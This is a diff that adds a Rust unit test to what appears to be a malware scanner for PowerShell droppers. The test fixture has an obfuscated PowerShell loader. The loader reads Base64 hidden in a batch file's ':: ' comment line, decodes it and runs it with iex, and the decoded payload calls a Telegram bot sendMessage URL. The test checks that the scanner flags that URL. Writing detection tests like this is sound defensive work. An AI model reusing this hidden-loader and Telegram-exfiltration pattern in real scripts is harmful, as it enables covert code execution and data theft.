@@ -15511,6 +15511,50 @@ iex $stage
     }
 
     #[test]
+    fn ps1_file_backed_colon_space_base64_loader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::sync::Arc;
+
+        let decoded =
+            "Invoke-WebRequest -Uri 'https://api.telegram.org/bot111:abc/sendMessage?chat_id=888'";
+        let mut utf16 = Vec::new();
+        for unit in decoded.encode_utf16() {
+            utf16.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+
+        let mut env = Environment::new(&Config::default());
+        env.input_bytes = Some(Arc::from(decoded.as_bytes().to_vec()));
+        env.modified_filesystem.insert(
+            r#"c:\users\jsmith\aoc.bat"#.to_string(),
+            FsEntry::Content {
+                content: format!(":: {b64}\r\n").into_bytes(),
+                append: false,
+            },
+        );
+        env.all_extracted_ps1.push(
+            br#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":: *"};$apple=($rawLines|%{$_.Substring(3)});if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#
+                .to_vec(),
+        );
+
+        crate::ps1_scan::extract_self_embedded_ps1(
+            &mut env,
+            r#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":: *"};$apple=($rawLines|%{$_.Substring(3)});if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#,
+        );
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot111:abc/sendMessage?chat_id=888")
+            )),
+            "file-backed colon-space Base64 payload did not emit Telegram URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn ps1_normalization_escapes_binary_controls() {
         let normalized = crate::ps1_scan::normalize_ps1_text("Invoke-Expression 'A\0B\x01C'\r\n");
         assert!(
